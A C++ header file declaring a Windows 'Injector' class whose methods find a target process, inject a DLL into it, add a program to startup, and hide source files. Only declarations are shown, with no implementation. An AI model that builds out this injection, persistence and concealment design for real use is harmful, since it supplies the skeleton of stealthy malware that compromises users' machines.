#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <string>
#include <tlhelp32.h>

#define MAX_USERNAME_SIZE 100

class Injector
{
public:
	Injector();
	~Injector();
	BOOL				getTargetProcess(std::wstring processName);
	BOOL				createPath(std::string dllName);
	BOOL				injectDll(HANDLE hProcess, LPCSTR lpModuleName, LPCSTR lpProcName, LPVOID lpParameters, SIZE_T dwParamSize);
	BOOL				checkStartingProcess(PCWSTR exeName);
	BOOL				addToStartingProcess(PCWSTR exeName);
	BOOL				hideSources();
	const HANDLE &		getProcess();
	const std::string &	getPathDll();

private:
	DWORD				findProcess(std::wstring processName);
	HANDLE				_proc;
	std::string			_pathDll;
	std::wstring		_pathHiddenFile;
};
